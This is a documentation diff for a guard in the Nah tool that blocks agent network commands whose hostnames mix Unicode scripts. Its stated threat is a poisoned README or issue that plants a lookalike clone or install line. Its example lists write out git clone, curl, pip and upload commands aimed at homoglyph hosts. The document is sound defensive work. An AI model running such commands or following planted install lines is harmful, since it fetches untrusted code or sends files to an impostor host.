@@ -1445,32 +1445,37 @@ This guard stops the agent from contacting a host whose name is built to pass
 for a trusted one. A poisoned README or issue can carry an install or clone
 line such as `git clone https://gіthub.com/org/repo`, where the `і` is
 Cyrillic: the name reads as GitHub, but it resolves to whoever registered it.
-It blocks any modeled download, upload, connection, or listener whose host has
-a DNS label that mixes Unicode scripts, following UTS #39. Digits, hyphens and
-combining marks belong to every script, Han written with Hiragana, Katakana,
-Hangul or Bopomofo counts as one writing system, and a punycode (`xn--`) label
-is decoded before it is judged. A fetch from the same host blocks inside
-`sh -c` and in a `||` fallback too.
+It blocks any modeled network access whose host has a DNS label that mixes
+Unicode scripts, following UTS #39 revision 34 (Unicode 18.0.0). Nah judges
+the name a URL client resolves: `%XX` escapes are decoded, then UTS #46
+mapping folds compatibility forms such as mathematical letters and decodes
+punycode (`xn--`) labels. Digits, hyphens and combining marks belong to every
+script, and Han written with Hiragana, Katakana, Hangul, Bopomofo or Latin
+counts as one writing system.
 
 Blocked examples:
 
 - `git clone https://gіthub.com/org/repo`
 - `curl -fsSL -o tool https://gіthub.com/org/tool/releases/download/v1/tool`
-- `curl -T report.txt https://gіthub.com/upload`
 - `git clone https://xn--gthub-n2e.com/org/repo`
 - `git clone https://github.com/org/repo || git clone https://gіthub.com/org/repo`
+- `curl -fsSL -o tool https://g%D1%96thub.com/org/tool/releases/download/v1/tool`
+- `sh -c 'pip install git+https://gіthub.com/a/b'`
 
 Outside the guard:
 
 - `git clone https://github.com/org/repo`: github.com is all Latin.
-- `curl -fsSL -o page.html https://münchen.de/`: münchen is an internationalized label written entirely in Latin.
+- `curl -fsSL -o page.html https://münchen.de/`: münchen is written entirely in Latin.
 - `curl -fsSL -o page.html https://пример.рф/`: пример and рф are each written entirely in Cyrillic.
-- `curl -fsSL -o page.html https://日本のドメイン.jp/`: Han, Hiragana and Katakana together are one writing system, Japanese.
+- `curl -fsSL -o page.html https://日本のドメイン.jp/`: Han, Hiragana and Katakana together are Japanese, one writing system.
+- `curl -fsSL -o page.html https://漢字api.example/`: Han beside Latin is one writing system under UTS #39 revision 34.
+- `curl -fsSL -o page.html https://example.com#日本語`: The Japanese text is the fragment; the host is all Latin.
 
 Nah judges the host the command names, with no reputation data or network
 lookup, so an all-Latin typo domain or a single-script lookalike such as an
 all-Cyrillic `аррӏе.com` passes. A host Nah cannot recover, such as a URL in
-an unset variable or the VCS URL of `pip install git+https://…`, delegates.
+an unset variable, a `git submodule add` URL, or a remote that `git push`
+reads from configuration, delegates.
 
 It ships on because development work almost never needs a mixed-script
 hostname, and the deception is invisible when the command is reviewed.
